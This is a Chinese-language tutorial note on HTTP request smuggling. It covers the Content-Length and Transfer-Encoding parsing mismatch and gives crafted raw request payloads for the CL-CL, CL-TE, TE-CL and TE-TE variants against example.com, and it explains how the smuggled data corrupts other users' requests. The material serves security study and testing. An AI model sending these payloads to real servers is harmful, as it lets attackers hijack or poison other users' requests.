# HTTP_request_smuggling

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**相关文章**
- [HTTP Desync Attacks: Request Smuggling Reborn | Blog - PortSwigger](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn)
- [HTTP Desync Attacks: Smashing into the Cell Next Door ](https://xz.aliyun.com/t/5978) - 上面的翻译版
- [What is HTTP request smuggling? Tutorial & Examples](https://portswigger.net/web-security/request-smuggling)
- [HTTP request smuggling](https://saucer-man.com/information_security/368.html)
- [一篇文章带你读懂 HTTP Smuggling 攻击](https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/)
- [协议层的攻击——HTTP请求走私](https://paper.seebug.org/1048/)
- [Breaking the chains on HTTP Request Smuggler](https://portswigger.net/research/breaking-the-chains-on-http-request-smuggler)
- [从一道题深入HTTP协议与HTTP请求走私](https://xz.aliyun.com/t/6631)
- [流量夹带(HTTP Request Smuggling) 检测方案的实现](https://blog.riskivy.com/%e6%b5%81%e9%87%8f%e5%a4%b9%e5%b8%a6http-request-smuggling-%e6%a3%80%e6%b5%8b%e6%96%b9%e6%a1%88%e7%9a%84%e5%ae%9e%e7%8e%b0/)

**靶场**
- [ZeddYu/HTTP-Smuggling-Lab](https://github.com/ZeddYu/HTTP-Smuggling-Lab)

**burp扩展**
- [PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)

**相关工具**
- [defparam/smuggler](https://github.com/defparam/smuggler) - Python 3 编写的 HTTP 请求走私检测工具

---

# 漏洞产生的原因

HTTP Request Smuggling 最初是由 WatchFire1 于 2005 年记录下来的，由于难以利用和危害性无法控制，该问题一直处于被忽略的状态。直到 2019 年的 BlackHat USA 上，PortSwigger 的 James Kettle 在他的议题——HTTP Desync Attacks: Smashing into the Cell Next Door 中提出了一套较为完善的利用流程，这个漏洞才被人熟知。

上面我们说到了 HTTP 协议的基本原理，其中一个 HTTP 请求中可以有多种方式来指定消息的长度，比如：Content-Length、Transfer-Encoding。

但是当一个请求中同时出现了 2 种方法，就会发生一些问题。HTTP 规范 (RFC2616) 中定义，如果接收的消息同时包含传输编码头字段 (Transfer-Encoding) 和内容长度头 (Content-Length) 字段，则必须忽略后者。然而，后端服务器有自己的想法，它会同时处理。

---

# 几种走私请求利用方法

**CL 不为 0 的 GET 请求**

假设前端代理服务器允许 GET 请求携带请求体，而后端服务器不允许 GET 请求携带请求体，它会直接忽略掉 GET 请求中的 Content-Length 头，不进行处理。这就有可能导致请求走私。

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 44\r\n

GET / secret HTTP/1.1\r\n
Host: example.com\r\n
\r\n
```

前端服务器收到该请求，通过读取 Content-Length，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对 Content-Length 进行处理，由于 Pipeline 的存在，它就认为这是收到了两个请求，分别是
```
GET / HTTP/1.1\r\n
Host: example.com\r\n
```
```
GET / secret HTTP/1.1\r\n
Host: example.com\r\n
```

**CL-CL**

假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回 400 错误，但是中间代理服务器按照第一个 Content-Length 的值对请求进行处理，而后端源站服务器按照第二个 Content-Length 的值进行处理, 这样便有可能引发请求走私。

此时恶意攻击者可以构造一个特殊的请求

```
POST / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n

12345\r\n
a
```
中间代理服务器获取到的数据包的长度为 8，将上述整个数据包原封不动的转发给后端的源站服务器，而后端服务器获取到的数据包长度为 7。当读取完前 7 个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母 a，对于后端服务器来说，这个 a 是下一个请求的一部分，但是还没有传输完毕。此时恰巧有一个其他的正常用户对服务器进行了请求，假设请求如下所示。

```
GET /index.html HTTP/1.1\r\n
Host: example.com\r\n
```
从前面我们也知道了，代理服务器与源站服务器之间一般会重用 TCP 连接。

这时候正常用户的请求就拼接到了字母 a 的后面，当后端服务器接收完毕后，它实际处理的请求其实是

```
aGET /index.html HTTP/1.1\r\n
Host: example.com\r\n
```
这时候用户就会收到一个类似于 aGET request method not found 的报错。这样就实现了一次 HTTP 走私攻击，而且还对正常用户的行为造成了影响，而且后续可以扩展成类似于 CSRF 的攻击方式。

**CL-TE**

所谓 CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理 Content-Length 这一请求头，而后端服务器会遵守 RFC2616 的规定，忽略掉 Content-Length，处理 Transfer-Encoding 这一请求头。

chunk 传输数据格式如下，其中 size 的值由 16 进制表示。

```
[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]
```
此时恶意攻击者可以构造一个特殊的请求

```
POST / HTTP/1.1\r\n
Host: example.com\r\n
Connection: keep-alive\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
G
```
由于前端服务器处理 Content-Length，所以这个请求对于它来说是一个完整的请求，请求体的长度为 6，也就是

```
0\r\n
\r\n
G
```
当请求包经过代理服务器转发给后端服务器时，后端服务器处理 Transfer-Encoding，当它读取到 0\r\n\r\n 时，认为已经读取到结尾了，但是剩下的字母 G 就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求。
```
GPOST / HTTP/1.1\r\n
Host: example.com\r\n
......
```

**TE-CL**

所谓 TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理 Transfer-Encoding 这一请求头，而后端服务器处理 Content-Length 请求头。

构造数据包

```
POST / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
12\r\n
GPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n
```
由于前端服务器处理 Transfer-Encoding，当其读取到 0\r\n\r\n 时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理 Content-Length 请求头，当它读取完 12\r\n 之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是
```
GPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n
```

**TE-TE**

TE-TE，也很容易理解。当收到存在两个请求头的请求包时，前后端服务器都处理 Transfer-Encoding 请求头，这确实是实现了 RFC 的标准。不过前后端服务器毕竟不是同一种，因而我们可以对发送的请求包中的 Transfer-Encoding 进行某种混淆操作，从而使其中一个服务器不处理 Transfer-Encoding 请求头。从某种意义上还是 CL-TE 或者 TE-CL。

```
POST / HTTP/1.1\r\n
Host: example.com\r\n
Content-length: 4\r\n
Transfer-Encoding: chunked\r\n
Transfer-encoding: cow\r\n
\r\n
5c\r\n
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
```
